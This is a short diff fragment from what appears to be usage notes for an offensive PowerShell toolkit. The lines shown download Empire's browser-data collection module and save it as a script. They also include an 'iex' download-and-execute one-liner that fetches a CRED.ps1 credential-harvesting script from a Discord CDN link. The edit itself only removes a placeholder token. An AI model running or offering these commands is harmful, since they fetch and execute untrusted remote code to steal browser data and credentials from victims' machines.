@@ -5,7 +5,7 @@ Usage: (-Email) : Powershell $attachment = '{cmdxx}'
 
 Usage: (-History) : Out-File -FilePath ./histroy.ps1 -InputObject (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/collection/Get-BrowserData.ps1").content -Encoding UTF8 
      echo "Finished."
-     Add-Content ./histroy.ps1 "Get-BrowserInformation {cmdxx}
+     Add-Content ./histroy.ps1 "Get-BrowserInformation"
 
 Usage: (-creds) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/951960825093058631/CRED.ps1'))
 				
